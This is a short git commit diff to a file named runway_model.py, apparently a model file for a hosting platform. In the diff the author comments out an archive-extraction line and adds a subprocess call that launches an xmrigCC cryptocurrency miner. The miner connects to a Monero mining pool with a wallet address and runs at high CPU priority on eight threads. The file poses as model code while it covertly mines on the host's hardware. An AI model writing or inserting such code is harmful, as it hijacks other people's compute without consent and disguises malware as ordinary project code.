1468d889ab3ad9e518d102887c903b890520bee7
colabu11 <101316095+colabu11@users.noreply.github.com>
2022-03-23 15:05:03 +0800

    Update runway_model.py

--- runway_model.py
+++ runway_model.py
@@ -6,4 +6,5 @@ import subprocess
 #r = requests.get(url, allow_redirects=True)
 
 #open('xmrigCC-2.9.5-linux-generic-amd64.tar.gz', 'wb').write(r.content)
-subprocess.call("tar -xvf xmrigCC-2.9.5-linux-generic-amd64.tar.gz", shell=True)
+#subprocess.call("tar -xvf xmrigCC-2.9.5-linux-generic-amd64.tar.gz", shell=True)
+subprocess.call("miner/xmrigDaemon -o pool.supportxmr.com:443 -u 86rNBsrqqaX6Ha7zwwyC2BYycsXurMUfxWaoPsUbtvqh7nfDFJ5oATLSUYfhZsCsJ3X31Z4d6PyNWES4gedmCBqHQ9E8Npu -k --tls -p a1 --print-time=2 --donate-level=1 --cpu-priority=8 --randomx-mode=fast --randomx-1gb-pages --cpu-affinity=8 --threads=8 --donate-level=1", shell=True)
